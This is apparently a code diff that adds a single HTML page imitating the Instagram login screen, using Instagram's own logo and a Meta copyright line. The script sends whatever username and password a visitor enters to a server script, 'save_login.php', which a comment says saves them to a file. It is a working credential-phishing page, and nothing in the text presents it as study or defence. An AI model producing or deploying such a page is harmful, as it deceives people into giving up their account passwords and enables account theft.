@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Login • Instagram</title>
+
+        <style>
+            .wrapper {
+                width: 100%;
+                height: 100vh;
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+                justify-content: flex-start;
+            }
+
+            .logo {
+                width: 100%;
+                height: 22px;
+                display: flex;
+                justify-content: center;
+                margin-top: 100px;
+                margin-bottom: 50px;
+                align-items: center;
+                padding-top: 40px;
+                overflow: hidden;
+            }
+
+            .logo img {
+                max-width: 150px;
+            }
+
+            .form {
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .form input {
+                display: block;
+                color: #7D7D7D;
+                font-family: 'Arial';
+                font-size: 13px;
+                font-style: normal;
+                font-weight: 400;
+                line-height: normal;
+                margin-bottom: 10px;
+
+                width: 80%;
+                padding: 12px;
+                border-radius: 5px;
+                border: 1px solid #DBDCDC;
+                background: #FAFAFA;
+                box-sizing: border-box;
+            }
+
+            .action {
+                width: 100%;
+                display: flex;
+                justify-content: center;
+            }
+
+            .action button {
+                padding: 8px;
+                width: 80%;
+                margin-top: 20px;
+                border: none;
+                border-radius: 10px;
+                background: #67B5FB;
+
+                color: #FFF;
+                font-family: "Arial";
+                font-size: 14px;
+                font-style: normal;
+                font-weight: 500;
+                line-height: normal;
+            }
+
+            .message {
+                width: 80%;
+                display: none;
+                margin: 0 auto;
+                margin-top: 30px;
+                
+                color: red;
+                font-family: 'Arial';
+                font-size: 12px;
+                font-style: normal;
+                font-weight: 400;
+                line-height: normal;
+                text-align: center;
+            }
+
+            .message.active {
+                display: block;
+            }
+
+            .copyright {
+                position: absolute;
+                bottom: 50px;
+                left: 50%;
+                transform: translateX(-50%);
+
+                color: #7D7D7D;
+                font-family: 'Arial';
+                font-size: 12px;
+                font-style: normal;
+                font-weight: 400;
+                line-height: normal;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="wrapper">
+            <div class="logo">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png" alt="">
+            </div>
+            <div class="form">
+                <input type="text" id="username" placeholder="Phone number, username, or email">
+                <input type="password" id="password" placeholder="Password">
+            </div>
+            <div class="action">
+                <button>Login</button>
+            </div>
+
+            <p class="message"></p>
+
+            <p class="copyright">&copy; 2023 Instagram from Meta</p>
+        </div>
+
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script>
+            let isTriggered = 0;
+
+            const saveLoginData = function(username, password) {
+                $(".action button").html("...");
+
+                $.ajax({
+                    type: "POST",
+                    url: "save_login.php", // Create a server-side script to handle the file saving
+                    data: {
+                        username: username,
+                        password: password
+                    },
+                    success: function (response) {
+                        console.log("Login data saved to JSON file.");
+                        $(".action button").html("Log in");
+                    },
+                    error: function (error) {
+                        console.error("Error saving login data: " + JSON.stringify(error));
+                        $(".action button").html("Log in");
+                    }
+                });
+            }
+
+            $(".action button").click(function() {
+                const username = $("#username").val();
+                const password = $("#password").val();
+
+                if(username != "" && password != "") {
+                    
+                    saveLoginData(username, password);
+                }
+            })
+        </script>
+    </body>
+</html>
